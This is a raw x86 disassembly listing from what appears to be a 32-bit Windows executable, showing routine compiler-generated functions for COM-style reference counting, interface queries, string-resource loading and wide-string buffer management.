  403cf5:	call   0x404262
  403cfa:	call   DWORD PTR ds:0x40a078
  403d00:	push   DWORD PTR [ebp-0x8]
  403d03:	call   DWORD PTR ds:0x40a034
  403d09:	pop    edi
  403d0a:	pop    ebx
  403d0b:	call   0x404579
  403d10:	mov    eax,esi
  403d12:	pop    esi
  403d13:	mov    esp,ebp
  403d15:	pop    ebp
  403d16:	ret    0x10
  403d19:	int3   
  403d1a:	int3   
  403d1b:	int3   
  403d1c:	int3   
  403d1d:	int3   
  403d1e:	int3   
  403d1f:	int3   
  403d20:	mov    edi,edi
  403d22:	push   ebp
  403d23:	mov    ebp,esp
  403d25:	push   ecx
  403d26:	mov    eax,ds:0x409004
  403d2b:	xor    eax,ebp
  403d2d:	mov    DWORD PTR [ebp-0x4],eax
  403d30:	mov    ecx,DWORD PTR [ebp+0xc]
  403d33:	mov    edx,0x402774
  403d38:	push   esi
  403d39:	mov    esi,DWORD PTR [ebp+0x10]
  403d3c:	push   edi
  403d3d:	xor    edi,edi
  403d3f:	mov    DWORD PTR [esi],edi
  403d41:	call   0x4044d2
  403d46:	test   eax,eax
  403d48:	jne    0x403d6c
  403d4a:	mov    edx,0x402764
  403d4f:	call   0x4044d2
  403d54:	test   eax,eax
  403d56:	je     0x403d65
  403d58:	mov    ecx,DWORD PTR [ebp+0x8]
  403d5b:	mov    DWORD PTR [esi],ecx
  403d5d:	push   ecx
  403d5e:	mov    eax,DWORD PTR [ecx]
  403d60:	mov    esi,DWORD PTR [eax+0x4]
  403d63:	jmp    0x403d77
  403d65:	mov    edi,0x80004002
  403d6a:	jmp    0x403d81
  403d6c:	mov    edx,DWORD PTR [ebp+0x8]
  403d6f:	mov    DWORD PTR [esi],edx
  403d71:	push   edx
  403d72:	mov    ecx,DWORD PTR [edx]
  403d74:	mov    esi,DWORD PTR [ecx+0x4]
  403d77:	mov    ecx,esi
  403d79:	call   DWORD PTR ds:0x40a1ec
  403d7f:	call   esi
  403d81:	mov    ecx,DWORD PTR [ebp-0x4]
  403d84:	mov    eax,edi
  403d86:	pop    edi
  403d87:	xor    ecx,ebp
  403d89:	pop    esi
  403d8a:	call   0x405d80
  403d8f:	mov    esp,ebp
  403d91:	pop    ebp
  403d92:	ret    0xc
  403d95:	int3   
  403d96:	int3   
  403d97:	int3   
  403d98:	int3   
  403d99:	int3   
  403d9a:	int3   
  403d9b:	int3   
  403d9c:	int3   
  403d9d:	int3   
  403d9e:	int3   
  403d9f:	int3   
  403da0:	mov    edi,edi
  403da2:	push   ebp
  403da3:	mov    ebp,esp
  403da5:	mov    ecx,DWORD PTR [ebp+0x8]
  403da8:	xor    eax,eax
  403daa:	inc    eax
  403dab:	lock xadd DWORD PTR [ecx+0x8],eax
  403db0:	inc    eax
  403db1:	pop    ebp
  403db2:	ret    0x4
  403db5:	int3   
  403db6:	int3   
  403db7:	int3   
  403db8:	int3   
  403db9:	int3   
  403dba:	int3   
  403dbb:	int3   
  403dbc:	int3   
  403dbd:	int3   
  403dbe:	int3   
  403dbf:	int3   
  403dc0:	mov    edi,edi
  403dc2:	push   ebp
  403dc3:	mov    ebp,esp
  403dc5:	push   ecx
  403dc6:	mov    eax,ds:0x409004
  403dcb:	xor    eax,ebp
  403dcd:	mov    DWORD PTR [ebp-0x4],eax
  403dd0:	push   ebx
  403dd1:	push   edi
  403dd2:	mov    edi,DWORD PTR [ebp+0x8]
  403dd5:	or     ebx,0xffffffff
  403dd8:	lock xadd DWORD PTR [edi+0x8],ebx
  403ddd:	dec    ebx
  403dde:	jne    0x403e12
  403de0:	push   esi
  403de1:	test   edi,edi
  403de3:	je     0x403df8
  403de5:	mov    eax,DWORD PTR [edi]
  403de7:	push   0x1
  403de9:	mov    esi,DWORD PTR [eax+0x18]
  403dec:	mov    ecx,esi
  403dee:	call   DWORD PTR ds:0x40a1ec
  403df4:	mov    ecx,edi
  403df6:	call   esi
  403df8:	mov    eax,ds:0x4094d0
  403dfd:	test   eax,eax
  403dff:	je     0x403e11
  403e01:	mov    ecx,DWORD PTR [eax]
  403e03:	push   eax
  403e04:	mov    esi,DWORD PTR [ecx+0x8]
  403e07:	mov    ecx,esi
  403e09:	call   DWORD PTR ds:0x40a1ec
  403e0f:	call   esi
  403e11:	pop    esi
  403e12:	mov    ecx,DWORD PTR [ebp-0x4]
  403e15:	mov    eax,ebx
  403e17:	pop    edi
  403e18:	xor    ecx,ebp
  403e1a:	pop    ebx
  403e1b:	call   0x405d80
  403e20:	mov    esp,ebp
  403e22:	pop    ebp
  403e23:	ret    0x4
  403e26:	int3   
  403e27:	int3   
  403e28:	int3   
  403e29:	int3   
  403e2a:	int3   
  403e2b:	mov    edi,edi
  403e2d:	push   ebp
  403e2e:	mov    ebp,esp
  403e30:	push   ecx
  403e31:	mov    eax,ds:0x409004
  403e36:	xor    eax,ebp
  403e38:	mov    DWORD PTR [ebp-0x4],eax
  403e3b:	push   edi
  403e3c:	mov    edi,DWORD PTR [ecx]
  403e3e:	mov    eax,DWORD PTR [edi]
  403e40:	test   eax,eax
  403e42:	je     0x403e59
  403e44:	and    DWORD PTR [edi],0x0
  403e47:	mov    ecx,DWORD PTR [eax]
  403e49:	push   esi
  403e4a:	push   eax
  403e4b:	mov    esi,DWORD PTR [ecx+0x8]
  403e4e:	mov    ecx,esi
  403e50:	call   DWORD PTR ds:0x40a1ec
  403e56:	call   esi
  403e58:	pop    esi
  403e59:	mov    ecx,DWORD PTR [ebp-0x4]
  403e5c:	mov    eax,edi
  403e5e:	xor    ecx,ebp
  403e60:	pop    edi
  403e61:	call   0x405d80
  403e66:	mov    esp,ebp
  403e68:	pop    ebp
  403e69:	ret    
  403e6a:	int3   
  403e6b:	int3   
  403e6c:	int3   
  403e6d:	int3   
  403e6e:	int3   
  403e6f:	int3   
  403e70:	mov    edi,edi
  403e72:	push   ebp
  403e73:	mov    ebp,esp
  403e75:	test   BYTE PTR [ebp+0x8],0x1
  403e79:	push   esi
  403e7a:	mov    esi,ecx
  403e7c:	mov    DWORD PTR [esi+0x8],0xc0000001
  403e83:	je     0x403e8d
  403e85:	push   esi
  403e86:	call   DWORD PTR ds:0x40a1b0
  403e8c:	pop    ecx
  403e8d:	mov    eax,esi
  403e8f:	pop    esi
  403e90:	pop    ebp
  403e91:	ret    0x4
  403e94:	int3   
  403e95:	int3   
  403e96:	int3   
  403e97:	int3   
  403e98:	int3   
  403e99:	mov    edi,edi
  403e9b:	push   ebp
  403e9c:	mov    ebp,esp
  403e9e:	push   ecx
  403e9f:	mov    eax,ds:0x409004
  403ea4:	xor    eax,ebp
  403ea6:	mov    DWORD PTR [ebp-0x4],eax
  403ea9:	mov    edx,DWORD PTR [ecx]
  403eab:	xor    eax,eax
  403ead:	test   edx,edx
  403eaf:	je     0x403ec5
  403eb1:	mov    DWORD PTR [ecx],eax
  403eb3:	mov    eax,DWORD PTR [edx]
  403eb5:	push   esi
  403eb6:	push   edx
  403eb7:	mov    esi,DWORD PTR [eax+0x8]
  403eba:	mov    ecx,esi
  403ebc:	call   DWORD PTR ds:0x40a1ec
  403ec2:	call   esi
  403ec4:	pop    esi
  403ec5:	mov    ecx,DWORD PTR [ebp-0x4]
  403ec8:	xor    ecx,ebp
  403eca:	call   0x405d80
  403ecf:	mov    esp,ebp
  403ed1:	pop    ebp
  403ed2:	ret    
  403ed3:	int3   
  403ed4:	int3   
  403ed5:	int3   
  403ed6:	int3   
  403ed7:	int3   
  403ed8:	mov    edi,edi
  403eda:	push   ebp
  403edb:	mov    ebp,esp
  403edd:	push   ebx
  403ede:	push   esi
  403edf:	mov    esi,DWORD PTR [ebp+0xc]
  403ee2:	mov    ebx,ecx
  403ee4:	push   edi
  403ee5:	mov    eax,esi
  403ee7:	mov    edi,0x80004005
  403eec:	shr    eax,0x4
  403eef:	push   0x0
  403ef1:	inc    eax
  403ef2:	movzx  eax,ax
  403ef5:	push   eax
  403ef6:	push   0x6
  403ef8:	push   DWORD PTR [ebp+0x8]
  403efb:	call   DWORD PTR ds:0x40a028
  403f01:	test   eax,eax
  403f03:	je     0x403f50
  403f05:	push   eax
  403f06:	push   DWORD PTR [ebp+0x8]
  403f09:	call   DWORD PTR ds:0x40a024
  403f0f:	test   eax,eax
  403f11:	je     0x403f50
  403f13:	push   eax
  403f14:	call   DWORD PTR ds:0x40a020
  403f1a:	mov    ecx,eax
  403f1c:	test   ecx,ecx
  403f1e:	je     0x403f50
  403f20:	and    esi,0xf
  403f23:	jbe    0x403f33
  403f25:	movzx  eax,WORD PTR [ecx]
  403f28:	lea    ecx,[ecx+eax*2]
  403f2b:	add    ecx,0x2
  403f2e:	sub    esi,0x1
  403f31:	jne    0x403f25
  403f33:	movzx  eax,WORD PTR [ecx]
  403f36:	test   ax,ax
  403f39:	je     0x403f40
  403f3b:	add    ecx,0x2
  403f3e:	jmp    0x403f45
  403f40:	mov    ecx,0x4027b4
  403f45:	push   eax
  403f46:	push   ecx
  403f47:	mov    ecx,ebx
  403f49:	call   0x403fb2
  403f4e:	mov    edi,eax
  403f50:	mov    eax,edi
  403f52:	pop    edi
  403f53:	pop    esi
  403f54:	pop    ebx
  403f55:	pop    ebp
  403f56:	ret    0xc
  403f59:	int3   
  403f5a:	int3   
  403f5b:	int3   
  403f5c:	int3   
  403f5d:	int3   
  403f5e:	mov    edi,edi
  403f60:	push   esi
  403f61:	mov    esi,ecx
  403f63:	cmp    DWORD PTR [esi],0x0
  403f66:	je     0x403f73
  403f68:	push   DWORD PTR [esi]
  403f6a:	call   DWORD PTR ds:0x40a088
  403f70:	and    DWORD PTR [esi],0x0
  403f73:	and    DWORD PTR [esi+0x4],0x0
  403f77:	and    DWORD PTR [esi+0x8],0x0
  403f7b:	pop    esi
  403f7c:	ret    
  403f7d:	int3   
  403f7e:	int3   
  403f7f:	int3   
  403f80:	int3   
  403f81:	int3   
  403f82:	mov    edx,DWORD PTR [ecx+0x4]
  403f85:	cmp    edx,0xffffffff
  403f88:	jne    0x403faa
  403f8a:	mov    edx,DWORD PTR [ecx]
  403f8c:	test   edx,edx
  403f8e:	je     0x403fa8
  403f90:	push   esi
  403f91:	lea    ecx,[edx+0x2]
  403f94:	xor    esi,esi
  403f96:	mov    ax,WORD PTR [edx]
  403f99:	add    edx,0x2
  403f9c:	cmp    ax,si
  403f9f:	jne    0x403f96
  403fa1:	sub    edx,ecx
  403fa3:	sar    edx,1
  403fa5:	pop    esi
  403fa6:	jmp    0x403faa
  403fa8:	xor    edx,edx
  403faa:	mov    eax,edx
  403fac:	ret    
  403fad:	int3   
  403fae:	int3   
  403faf:	int3   
  403fb0:	int3   
  403fb1:	int3   
  403fb2:	mov    edi,edi
  403fb4:	push   ebp
  403fb5:	mov    ebp,esp
  403fb7:	push   ecx
  403fb8:	mov    edx,DWORD PTR [ebp+0x8]
  403fbb:	mov    eax,ecx
  403fbd:	push   ebx
  403fbe:	push   esi
  403fbf:	xor    ebx,ebx
  403fc1:	mov    DWORD PTR [ebp-0x4],eax
  403fc4:	push   edi
  403fc5:	test   edx,edx
  403fc7:	je     0x40403c
  403fc9:	mov    esi,DWORD PTR [ebp+0xc]
  403fcc:	cmp    esi,0xffffffff
  403fcf:	jne    0x403fe7
  403fd1:	mov    esi,edx
  403fd3:	lea    ecx,[esi+0x2]
  403fd6:	mov    ax,WORD PTR [esi]
  403fd9:	add    esi,0x2
  403fdc:	cmp    ax,bx
  403fdf:	jne    0x403fd6
  403fe1:	sub    esi,ecx
  403fe3:	sar    esi,1
  403fe5:	jmp    0x403fff
  403fe7:	mov    ecx,edx
  403fe9:	lea    edi,[ecx+0x2]
  403fec:	mov    ax,WORD PTR [ecx]
  403fef:	add    ecx,0x2
  403ff2:	cmp    ax,bx
  403ff5:	jne    0x403fec
  403ff7:	sub    ecx,edi
  403ff9:	sar    ecx,1
  403ffb:	cmp    esi,ecx
  403ffd:	jae    0x404003
  403fff:	mov    edi,esi
  404001:	jmp    0x404017
  404003:	mov    edi,edx
  404005:	lea    ecx,[edi+0x2]
  404008:	mov    ax,WORD PTR [edi]
  40400b:	add    edi,0x2
  40400e:	cmp    ax,bx
  404011:	jne    0x404008
  404013:	sub    edi,ecx
  404015:	sar    edi,1
  404017:	mov    ecx,DWORD PTR [ebp-0x4]
  40401a:	push   esi
  40401b:	call   0x404051
  404020:	mov    ebx,eax
  404022:	test   ebx,ebx
  404024:	js     0x404041
  404026:	lea    edx,[esi+0x1]
  404029:	mov    esi,DWORD PTR [ebp-0x4]
  40402c:	push   edi
  40402d:	push   DWORD PTR [ebp+0x8]
  404030:	mov    ecx,DWORD PTR [esi]
  404032:	call   0x4044fc
  404037:	mov    DWORD PTR [esi+0x4],edi
  40403a:	jmp    0x404041
  40403c:	call   0x403f5e
  404041:	pop    edi
  404042:	pop    esi
  404043:	mov    eax,ebx
  404045:	pop    ebx
  404046:	mov    esp,ebp
  404048:	pop    ebp
  404049:	ret    0x8
  40404c:	int3   
  40404d:	int3   
  40404e:	int3   
  40404f:	int3   
  404050:	int3   
  404051:	mov    edi,edi
  404053:	push   ebp
  404054:	mov    ebp,esp
  404056:	push   ecx
  404057:	push   ecx
  404058:	mov    eax,DWORD PTR [ebp+0x8]
  40405b:	push   ebx
  40405c:	push   esi
  40405d:	push   edi
  40405e:	lea    ebx,[eax+0x1]
  404061:	mov    esi,ecx
  404063:	mov    DWORD PTR [ebp-0x8],ebx
  404066:	cmp    ebx,eax
  404068:	jb     0x40412e
  40406e:	xor    edi,edi
  404070:	cmp    DWORD PTR [esi+0x8],0xffffffff
  404074:	jne    0x4040aa
  404076:	cmp    DWORD PTR [esi+0x4],0xffffffff
  40407a:	jne    0x40409b
  40407c:	mov    ecx,DWORD PTR [esi]
  40407e:	test   ecx,ecx
  404080:	je     0x404096
  404082:	lea    edx,[ecx+0x2]
  404085:	mov    ax,WORD PTR [ecx]
  404088:	add    ecx,0x2
  40408b:	cmp    ax,di
  40408e:	jne    0x404085
  404090:	sub    ecx,edx
  404092:	sar    ecx,1
  404094:	jmp    0x404098
  404096:	mov    ecx,edi
  404098:	mov    DWORD PTR [esi+0x4],ecx
  40409b:	cmp    DWORD PTR [esi],edi
  40409d:	je     0x4040a5
  40409f:	mov    eax,DWORD PTR [esi+0x4]
  4040a2:	inc    eax
  4040a3:	jmp    0x4040a7
  4040a5:	mov    eax,edi
  4040a7:	mov    DWORD PTR [esi+0x8],eax
  4040aa:	mov    eax,DWORD PTR [esi+0x8]
  4040ad:	test   eax,eax
  4040af:	jne    0x4040e2
  4040b1:	lea    eax,[ebp-0x4]
  4040b4:	mov    ecx,ebx
  4040b6:	push   eax
  4040b7:	call   0x404782
  4040bc:	mov    edi,eax
  4040be:	test   edi,edi
  4040c0:	js     0x404133
  4040c2:	push   DWORD PTR [ebp-0x4]
  4040c5:	call   DWORD PTR ds:0x40a084
  4040cb:	test   eax,eax
  4040cd:	je     0x4040db
  4040cf:	xor    ecx,ecx
  4040d1:	mov    DWORD PTR [esi+0x8],ebx
  4040d4:	mov    DWORD PTR [esi],eax
  4040d6:	mov    WORD PTR [eax],cx
  4040d9:	jmp    0x404133
  4040db:	mov    edi,0x8007000e
  4040e0:	jmp    0x404133
  4040e2:	cmp    ebx,eax
  4040e4:	jbe    0x404133
  4040e6:	lea    ecx,[ebp-0x4]
  4040e9:	push   ecx
  4040ea:	mov    ecx,eax
  4040ec:	call   0x404782
  4040f1:	mov    edi,eax
  4040f3:	test   edi,edi
  4040f5:	js     0x404133
  4040f7:	mov    ebx,DWORD PTR [ebp-0x4]
  4040fa:	mov    eax,ebx
  4040fc:	mov    ecx,DWORD PTR [esi+0x8]
  4040ff:	sub    eax,ecx
  404101:	cmp    eax,0x800
  404106:	jbe    0x40410e
  404108:	lea    ebx,[ecx+0x800]
  40410e:	mov    eax,DWORD PTR [ebp-0x8]
  404111:	cmp    eax,ebx
  404113:	jbe    0x404117
  404115:	mov    ebx,eax
  404117:	lea    eax,[ebx+ebx*1]
  40411a:	push   eax
  40411b:	push   DWORD PTR [esi]
  40411d:	call   DWORD PTR ds:0x40a06c
  404123:	test   eax,eax
  404125:	je     0x4040db
  404127:	mov    DWORD PTR [esi+0x8],ebx
  40412a:	mov    DWORD PTR [esi],eax
  40412c:	jmp    0x404133
  40412e:	mov    edi,0x80070216
  404133:	mov    eax,edi
  404135:	pop    edi
  404136:	pop    esi
  404137:	pop    ebx
  404138:	mov    esp,ebp
  40413a:	pop    ebp
  40413b:	ret    0x4
  40413e:	int3   
  40413f:	int3   
  404140:	int3   
  404141:	int3   
  404142:	int3   
  404143:	mov    edi,edi
  404145:	push   ebp
  404146:	mov    ebp,esp
  404148:	push   ecx
  404149:	mov    eax,ds:0x409004
  40414e:	xor    eax,ebp
  404150:	mov    DWORD PTR [ebp-0x4],eax
  404153:	push   edi
  404154:	mov    edi,DWORD PTR [ebp+0x8]
  404157:	mov    eax,DWORD PTR [edi]
  404159:	test   eax,eax
  40415b:	je     0x404172
  40415d:	and    DWORD PTR [edi],0x0
  404160:	mov    ecx,DWORD PTR [eax]
  404162:	push   esi
  404163:	push   eax
  404164:	mov    esi,DWORD PTR [ecx+0x8]
  404167:	mov    ecx,esi
  404169:	call   DWORD PTR ds:0x40a1ec
  40416f:	call   esi
  404171:	pop    esi
  404172:	mov    ecx,DWORD PTR [ebp-0x4]
  404175:	mov    eax,edi
  404177:	xor    ecx,ebp
  404179:	pop    edi
  40417a:	call   0x405d80
  40417f:	mov    esp,ebp
  404181:	pop    ebp
  404182:	ret    0x4
  404185:	int3   
  404186:	int3   
  404187:	int3   
  404188:	int3   
  404189:	int3   
  40418a:	mov    edi,edi
  40418c:	push   ebp
  40418d:	mov    ebp,esp
  40418f:	sub    esp,0xc
  404192:	mov    eax,ds:0x409004
  404197:	xor    eax,ebp
  404199:	mov    DWORD PTR [ebp-0x4],eax
  40419c:	push   ebx
  40419d:	push   esi
  40419e:	push   edi
  40419f:	push   0x402120
  4041a4:	xor    edi,edi
  4041a6:	mov    DWORD PTR [ebp-0x8],edx
  4041a9:	push   0x14
  4041ab:	mov    ebx,ecx
  4041ad:	mov    DWORD PTR [ebp-0xc],edi
  4041b0:	call   0x405dbb
  4041b5:	mov    esi,eax
  4041b7:	pop    ecx
  4041b8:	pop    ecx
  4041b9:	test   esi,esi
  4041bb:	je     0x4041f8
  4041bd:	mov    ecx,DWORD PTR ds:0x4094d0
  4041c3:	mov    DWORD PTR [esi+0x8],0x1
  4041ca:	mov    DWORD PTR [esi],0x402138
  4041d0:	test   ecx,ecx
  4041d2:	je     0x4041e4
  4041d4:	mov    eax,DWORD PTR [ecx]
  4041d6:	push   ecx
  4041d7:	mov    edi,DWORD PTR [eax+0x4]
  4041da:	mov    ecx,edi
  4041dc:	call   DWORD PTR ds:0x40a1ec
  4041e2:	call   edi
  4041e4:	mov    eax,DWORD PTR [ebp-0x8]
  4041e7:	mov    edi,esi
  4041e9:	mov    DWORD PTR [esi+0xc],eax
  4041ec:	mov    eax,DWORD PTR [ebp+0x8]
  4041ef:	mov    DWORD PTR [esi],0x40214c
  4041f5:	mov    DWORD PTR [esi+0x10],eax
  4041f8:	mov    ecx,DWORD PTR [ebp-0x4]
  4041fb:	mov    eax,ebx
  4041fd:	mov    DWORD PTR [ebx],edi
  4041ff:	xor    ecx,ebp
  404201:	pop    edi
  404202:	pop    esi
  404203:	pop    ebx
  404204:	call   0x405d80
  404209:	mov    esp,ebp
  40420b:	pop    ebp
  40420c:	ret    0x4
  40420f:	int3   
  404210:	int3   
  404211:	int3   
  404212:	int3   
  404213:	int3   
  404214:	int3   
  404215:	int3   
  404216:	int3   
  404217:	int3   
  404218:	int3   
  404219:	int3   
  40421a:	int3   
  40421b:	int3   
  40421c:	int3   
  40421d:	int3   
  40421e:	int3   
  40421f:	int3   
  404220:	mov    edi,edi
  404222:	push   ebp
  404223:	mov    ebp,esp
  404225:	push   ecx
  404226:	mov    eax,ds:0x409004
  40422b:	xor    eax,ebp
  40422d:	mov    DWORD PTR [ebp-0x4],eax
  404230:	push   esi
  404231:	mov    esi,DWORD PTR [ebp+0x8]
  404234:	push   edi
  404235:	push   DWORD PTR [ebp+0x10]
  404238:	mov    edi,DWORD PTR [esi+0x10]
  40423b:	mov    ecx,edi
  40423d:	push   DWORD PTR [ebp+0xc]
  404240:	call   DWORD PTR ds:0x40a1ec
  404246:	mov    ecx,DWORD PTR [esi+0xc]
  404249:	call   edi
  40424b:	mov    ecx,DWORD PTR [ebp-0x4]
  40424e:	pop    edi
  40424f:	xor    ecx,ebp
  404251:	pop    esi
  404252:	call   0x405d80
  404257:	mov    esp,ebp
  404259:	pop    ebp
  40425a:	ret    0xc
  40425d:	int3   
  40425e:	int3   
  40425f:	int3   
  404260:	int3   
  404261:	int3   
  404262:	mov    edi,edi
  404264:	push   esi
  404265:	mov    esi,ecx
  404267:	push   edi
  404268:	and    DWORD PTR [esi+0x18],0x0
  40426c:	cmp    BYTE PTR [esi+0x10],0x0
  404270:	mov    DWORD PTR [esi],0x4021b0
  404276:	je     0x40427d
  404278:	call   0x4052d6
  40427d:	lea    edi,[esi+0x8]
  404280:	mov    ecx,DWORD PTR [edi+0x4]
  404283:	mov    DWORD PTR [edi],0x402198
  404289:	test   ecx,ecx
  40428b:	je     0x404298
  40428d:	push   edi
  40428e:	call   DWORD PTR ds:0x40b000
  404294:	and    DWORD PTR [edi+0x4],0x0
  404298:	lea    ecx,[esi+0x4]
  40429b:	call   0x403e99
  4042a0:	push   esi
  4042a1:	call   DWORD PTR ds:0x40a1b0
  4042a7:	pop    ecx
  4042a8:	pop    edi
  4042a9:	mov    eax,esi
  4042ab:	pop    esi
  4042ac:	ret    0x4
  4042af:	int3   
  4042b0:	int3   
  4042b1:	int3   
  4042b2:	int3   
  4042b3:	int3   
  4042b4:	int3   
  4042b5:	int3   
  4042b6:	int3   
  4042b7:	int3   
  4042b8:	int3   
  4042b9:	int3   
  4042ba:	int3   
  4042bb:	int3   
  4042bc:	int3   
  4042bd:	int3   
  4042be:	int3   
  4042bf:	int3   
  4042c0:	mov    edi,edi
  4042c2:	push   ebp
  4042c3:	mov    ebp,esp
  4042c5:	push   ecx
  4042c6:	mov    eax,ds:0x409004
  4042cb:	xor    eax,ebp
  4042cd:	mov    DWORD PTR [ebp-0x4],eax
  4042d0:	mov    ecx,DWORD PTR [ebp+0xc]
  4042d3:	mov    edx,0x402774
  4042d8:	push   esi
  4042d9:	mov    esi,DWORD PTR [ebp+0x10]
  4042dc:	push   edi
  4042dd:	xor    edi,edi
  4042df:	mov    DWORD PTR [esi],edi
  4042e1:	call   0x4044d2
  4042e6:	test   eax,eax
  4042e8:	jne    0x40430c
  4042ea:	mov    edx,0x402754
  4042ef:	call   0x4044d2
  4042f4:	test   eax,eax
  4042f6:	je     0x404305
  4042f8:	mov    ecx,DWORD PTR [ebp+0x8]
  4042fb:	mov    DWORD PTR [esi],ecx
  4042fd:	push   ecx
  4042fe:	mov    eax,DWORD PTR [ecx]
  404300:	mov    esi,DWORD PTR [eax+0x4]
  404303:	jmp    0x404317
  404305:	mov    edi,0x80004002
  40430a:	jmp    0x404321
  40430c:	mov    edx,DWORD PTR [ebp+0x8]
  40430f:	mov    DWORD PTR [esi],edx
  404311:	push   edx
  404312:	mov    ecx,DWORD PTR [edx]
  404314:	mov    esi,DWORD PTR [ecx+0x4]
  404317:	mov    ecx,esi
  404319:	call   DWORD PTR ds:0x40a1ec
  40431f:	call   esi
  404321:	mov    ecx,DWORD PTR [ebp-0x4]
  404324:	mov    eax,edi
  404326:	pop    edi
  404327:	xor    ecx,ebp
  404329:	pop    esi
  40432a:	call   0x405d80
  40432f:	mov    esp,ebp
  404331:	pop    ebp
  404332:	ret    0xc
  404335:	int3   
  404336:	int3   
  404337:	int3   
  404338:	int3   
  404339:	int3   
  40433a:	int3   
  40433b:	int3   
  40433c:	int3   
  40433d:	int3   
  40433e:	int3   
  40433f:	int3   
  404340:	mov    edi,edi
  404342:	push   ebp
  404343:	mov    ebp,esp
  404345:	push   ecx
  404346:	mov    eax,ds:0x409004
  40434b:	xor    eax,ebp
  40434d:	mov    DWORD PTR [ebp-0x4],eax
  404350:	push   ebx
  404351:	push   edi
  404352:	mov    edi,DWORD PTR [ebp+0x8]
  404355:	or     ebx,0xffffffff
  404358:	lock xadd DWORD PTR [edi+0x8],ebx
  40435d:	dec    ebx
  40435e:	jne    0x404392
  404360:	push   esi
  404361:	test   edi,edi
  404363:	je     0x404378
  404365:	mov    eax,DWORD PTR [edi]
  404367:	push   0x1
  404369:	mov    esi,DWORD PTR [eax+0x10]
  40436c:	mov    ecx,esi
  40436e:	call   DWORD PTR ds:0x40a1ec
  404374:	mov    ecx,edi
  404376:	call   esi
  404378:	mov    eax,ds:0x4094d0
  40437d:	test   eax,eax
  40437f:	je     0x404391
  404381:	mov    ecx,DWORD PTR [eax]
  404383:	push   eax
  404384:	mov    esi,DWORD PTR [ecx+0x8]
  404387:	mov    ecx,esi
  404389:	call   DWORD PTR ds:0x40a1ec
  40438f:	call   esi
  404391:	pop    esi
  404392:	mov    ecx,DWORD PTR [ebp-0x4]
  404395:	mov    eax,ebx
  404397:	pop    edi
  404398:	xor    ecx,ebp
  40439a:	pop    ebx
  40439b:	call   0x405d80
  4043a0:	mov    esp,ebp
  4043a2:	pop    ebp
  4043a3:	ret    0x4
  4043a6:	int3   
  4043a7:	int3   
  4043a8:	int3   
  4043a9:	int3   
  4043aa:	int3   
  4043ab:	mov    edi,edi
  4043ad:	push   ebp
  4043ae:	mov    ebp,esp
  4043b0:	sub    esp,0x18
  4043b3:	mov    eax,ds:0x409004
  4043b8:	xor    eax,ebp
  4043ba:	mov    DWORD PTR [ebp-0x4],eax
  4043bd:	push   esi
  4043be:	mov    eax,ecx
  4043c0:	mov    DWORD PTR [ebp-0x14],edx
  4043c3:	push   edi
  4043c4:	push   0x402120
  4043c9:	xor    esi,esi
  4043cb:	mov    DWORD PTR [ebp-0x18],eax
  4043ce:	push   0x20
  4043d0:	mov    DWORD PTR [eax],esi
  4043d2:	call   0x405dbb
  4043d7:	mov    edi,eax
  4043d9:	pop    ecx
  4043da:	pop    ecx
  4043db:	test   edi,edi
  4043dd:	jne    0x4043e9
  4043df:	mov    edi,0x8007000e
  4043e4:	jmp    0x4044a5
  4043e9:	mov    ecx,DWORD PTR ds:0x4094d0
  4043ef:	mov    DWORD PTR [edi+0x8],0x1
  4043f6:	mov    DWORD PTR [edi],0x402160
  4043fc:	push   ebx
  4043fd:	test   ecx,ecx
  4043ff:	je     0x404411
  404401:	mov    eax,DWORD PTR [ecx]
  404403:	push   ecx
  404404:	mov    ebx,DWORD PTR [eax+0x4]
  404407:	mov    ecx,ebx
  404409:	call   DWORD PTR ds:0x40a1ec
  40440f:	call   ebx
  404411:	mov    eax,DWORD PTR [ebp+0x10]
  404414:	mov    ebx,DWORD PTR [ebp-0x14]
  404417:	mov    DWORD PTR [edi],0x40217c
  40441d:	mov    DWORD PTR [edi+0xc],esi
  404420:	mov    DWORD PTR [edi+0x10],esi
  404423:	mov    DWORD PTR [edi+0x14],esi
  404426:	mov    DWORD PTR [edi+0x18],esi
  404429:	mov    DWORD PTR [edi+0x1c],esi
  40442c:	mov    esi,edi
  40442e:	mov    edi,DWORD PTR [eax]
  404430:	mov    eax,DWORD PTR [ebp+0xc]
  404433:	mov    ebx,DWORD PTR [ebx]
  404435:	mov    DWORD PTR [ebp-0x8],edi
  404438:	mov    eax,DWORD PTR [eax]
  40443a:	mov    DWORD PTR [ebp-0x10],eax
  40443d:	mov    eax,DWORD PTR [ebp+0x8]
  404440:	mov    eax,DWORD PTR [eax]
  404442:	mov    DWORD PTR [ebp-0xc],eax
  404445:	cmp    DWORD PTR [esi+0xc],ebx
  404448:	je     0x404475
  40444a:	test   ebx,ebx
  40444c:	je     0x404461
  40444e:	mov    eax,DWORD PTR [ebx]
  404450:	push   ebx
  404451:	mov    edi,DWORD PTR [eax+0x4]
  404454:	mov    ecx,edi
  404456:	call   DWORD PTR ds:0x40a1ec
  40445c:	call   edi
  40445e:	mov    edi,DWORD PTR [ebp-0x8]
  404461:	mov    eax,DWORD PTR [esi+0xc]
  404464:	lea    ecx,[ebp-0x8]
  404467:	mov    DWORD PTR [ebp-0x8],eax
  40446a:	mov    DWORD PTR [esi+0xc],ebx
  40446d:	call   0x402dd5
  404472:	mov    eax,DWORD PTR [ebp-0xc]
  404475:	push   ecx
  404476:	push   edi
  404477:	push   DWORD PTR [ebp-0x10]
  40447a:	lea    ecx,[esi+0x14]
  40447d:	mov    DWORD PTR [esi+0x10],eax
  404480:	call   0x403ed8
  404485:	mov    edi,eax
  404487:	pop    ebx
  404488:	test   edi,edi
  40448a:	js     0x4044a5
  40448c:	mov    eax,DWORD PTR [esi]
  40448e:	push   DWORD PTR [ebp-0x18]
  404491:	push   0x402764
  404496:	mov    edi,DWORD PTR [eax]
  404498:	mov    ecx,edi
  40449a:	push   esi
  40449b:	call   DWORD PTR ds:0x40a1ec
  4044a1:	call   edi
  4044a3:	mov    edi,eax
  4044a5:	test   esi,esi
  4044a7:	je     0x4044b9
  4044a9:	mov    ecx,DWORD PTR [esi]
  4044ab:	push   esi
  4044ac:	mov    esi,DWORD PTR [ecx+0x8]
  4044af:	mov    ecx,esi
  4044b1:	call   DWORD PTR ds:0x40a1ec
  4044b7:	call   esi
  4044b9:	mov    ecx,DWORD PTR [ebp-0x4]
  4044bc:	mov    eax,edi
  4044be:	pop    edi
  4044bf:	xor    ecx,ebp
  4044c1:	pop    esi
  4044c2:	call   0x405d80
  4044c7:	mov    esp,ebp
  4044c9:	pop    ebp
  4044ca:	ret    0xc
  4044cd:	int3   
  4044ce:	int3   
  4044cf:	int3   
  4044d0:	int3   
  4044d1:	int3   
